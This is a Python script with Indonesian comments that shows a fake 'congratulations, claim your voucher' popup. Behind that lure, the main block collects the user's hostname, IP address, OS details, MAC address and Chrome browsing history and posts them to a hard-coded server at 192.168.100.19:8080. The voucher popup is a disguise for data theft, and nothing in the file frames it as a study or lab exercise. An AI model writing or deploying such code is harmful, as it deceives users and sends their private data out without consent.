import socket
import json
import requests
import platform
import uuid
import tkinter as tk
from tkinter import ttk
import random
import string
from tkinter import font as tkfont
from .browser_utils import get_chrome_history

SERVER_URL = "http://192.168.100.19:8080/report"
STORE_URL = "http://192.168.100.19:8080/store-voucher"

# Fungsi untuk mendapatkan IP address
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "0.0.0.0"

# Fungsi untuk mengumpulkan informasi sistem
def get_basic_info():
    return {
        "hostname": socket.gethostname(),
        "ip_address": get_ip(),
        "os": platform.system(),
        "os_version": platform.version(),
        "mac": hex(uuid.getnode()),
        "browser_history": get_chrome_history()
    }

# Fungsi untuk generate voucher code
def generate_voucher():
    def random_block():
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=4))
    return f"{random_block()}-{random_block()}-{random_block()}"

# Fungsi utama untuk menampilkan GUI
def show_message():
    root = tk.Tk()
    root.title("Voucher Hadiah")
    root.geometry("400x320")
    root.configure(bg="#ffffff")
    root.resizable(False, False)

    root.update()

    voucher_code = generate_voucher()

    try:
        requests.post(STORE_URL, json={"voucher_code": voucher_code})
        print(f"[INFO] Voucher dikirim ke server: {voucher_code}")
    except Exception as e:
        print(f"[ERROR] Gagal mengirim voucher ke server: {e}")

    def copy_to_clipboard():
        root.clipboard_clear()
        root.clipboard_append(voucher_code)
        copy_btn.config(text="âœ“ Disalin", state="disabled")
        voucher_label.config(bg="#f0f9eb", fg="#2e7d32")
        root.after(1500, lambda: [
            copy_btn.config(text="SALIN", state="normal"),
            voucher_label.config(bg="#ffffff", fg="#2e7d32")
        ])

    try:
        title_font = tkfont.Font(family="Segoe UI", size=16, weight="bold")
        subtitle_font = tkfont.Font(family="Segoe UI", size=10)
        voucher_font = tkfont.Font(family="Consolas", size=20, weight="bold")
        btn_font = tkfont.Font(family="Segoe UI", size=10, weight="bold")
    except:
        title_font = tkfont.Font(size=16, weight="bold")
        subtitle_font = tkfont.Font(size=10)
        voucher_font = tkfont.Font(family="Courier", size=20, weight="bold")
        btn_font = tkfont.Font(size=10, weight="bold")

    container = tk.Frame(root, bg="#ffffff")
    container.pack(expand=True, fill="both", padx=30, pady=25)

    tk.Label(container, text="ðŸŽ‰ SELAMAT!", font=title_font, bg="#ffffff", fg="#333333").pack(pady=(0, 10))
    tk.Label(container, text="KLAIM VOUCHER ANDA", font=subtitle_font, bg="#ffffff", fg="#666666").pack(pady=(0, 20))

    voucher_container = tk.Frame(container, bg="#ffffff", highlightthickness=1, highlightbackground="#e0e0e0")
    voucher_container.pack(pady=(0, 30), ipadx=10, ipady=5)

    voucher_label = tk.Label(voucher_container, text=voucher_code, font=voucher_font, bg="#ffffff", fg="#2e7d32", padx=20, pady=10)
    voucher_label.pack()

    btn_frame = tk.Frame(container, bg="#ffffff")
    btn_frame.pack()

    copy_btn = tk.Button(btn_frame, text="SALIN", command=copy_to_clipboard, font=btn_font,
                         bg="#4a90e2", fg="white", activebackground="#357abd", activeforeground="white",
                         bd=0, padx=25, pady=8, relief="flat", cursor="hand2")
    copy_btn.grid(row=0, column=0, padx=8)

    close_btn = tk.Button(btn_frame, text="TUTUP", command=root.destroy, font=btn_font,
                          bg="#f5f5f5", fg="#333333", activebackground="#e0e0e0", activeforeground="#333333",
                          bd=0, padx=25, pady=8, relief="flat", cursor="hand2")
    close_btn.grid(row=0, column=1, padx=8)

    def on_enter(e):
        e.widget.config(bg="#357abd" if e.widget == copy_btn else "#e0e0e0")

    def on_leave(e):
        e.widget.config(bg="#4a90e2" if e.widget == copy_btn else "#f5f5f5")

    copy_btn.bind("<Enter>", on_enter)
    copy_btn.bind("<Leave>", on_leave)
    close_btn.bind("<Enter>", on_enter)
    close_btn.bind("<Leave>", on_leave)

    x = (root.winfo_screenwidth() - root.winfo_width()) // 2
    y = (root.winfo_screenheight() - root.winfo_height()) // 2
    root.geometry(f"+{x}+{y}")

    root.attributes('-topmost', True)
    root.after(100, lambda: root.attributes('-topmost', False))

    root.mainloop()

if __name__ == "__main__":
    try:
        show_message()
        data = get_basic_info()
        requests.post(SERVER_URL, json=data)
    except Exception as e:
        print(f"[!] Terjadi error: {e}")
